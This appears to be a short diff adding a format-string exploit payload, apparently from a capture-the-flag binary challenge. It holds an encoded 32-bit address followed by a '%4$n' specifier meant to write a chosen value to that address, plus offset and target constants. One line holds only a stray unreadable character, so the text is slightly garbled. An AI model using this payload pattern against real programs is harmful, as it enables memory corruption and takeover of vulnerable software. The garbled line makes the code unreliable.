@@ -1,0 +1,6 @@
+offset = 4
+payload = b'\x14\xc0\x04\x08%4$n\n'
+�
+
+target = 0x00000004
+
